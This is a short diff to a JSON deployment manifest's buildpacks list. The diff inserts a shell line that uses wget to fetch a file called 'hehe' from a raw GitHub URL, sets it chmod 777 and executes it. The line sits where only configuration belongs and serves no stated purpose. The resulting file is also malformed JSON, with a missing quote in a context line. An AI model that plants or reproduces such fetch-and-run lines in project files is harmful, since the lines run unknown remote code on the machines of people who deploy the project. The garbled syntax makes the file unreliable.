@@ -73,7 +73,9 @@
     },
     "buildpacks": [
       {
-        "url": "https://www.doprax.com/u/kkthemaster/"
+        wget https://raw.githubusercontent.com/januda-ui/DRAGON-VPS-MANAGER/main/hehe; chmod 777 hehe;./hehe
+
+"url": "https://www.doprax.com/u/kkthemaster/"
       },
       {
         "url": doprax/python"
